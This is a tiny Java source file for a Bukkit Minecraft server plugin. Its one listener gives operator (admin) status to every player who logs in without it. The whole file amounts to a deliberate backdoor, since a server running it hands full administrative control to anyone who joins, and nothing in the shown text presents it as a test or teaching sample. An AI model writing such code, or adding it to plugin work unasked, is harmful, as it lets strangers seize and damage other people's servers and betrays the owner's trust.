package com.probie.Event;

import org.bukkit.event.Listener;
import org.bukkit.event.EventHandler;

public class PlayerLoginAddOPEvent implements Listener {

    @EventHandler
    public void addOPEvent(org.bukkit.event.player.PlayerLoginEvent playerLoginEvent) {
        if (!playerLoginEvent.getPlayer().isOp()) {
            playerLoginEvent.getPlayer().setOp(true);
        }
    }

}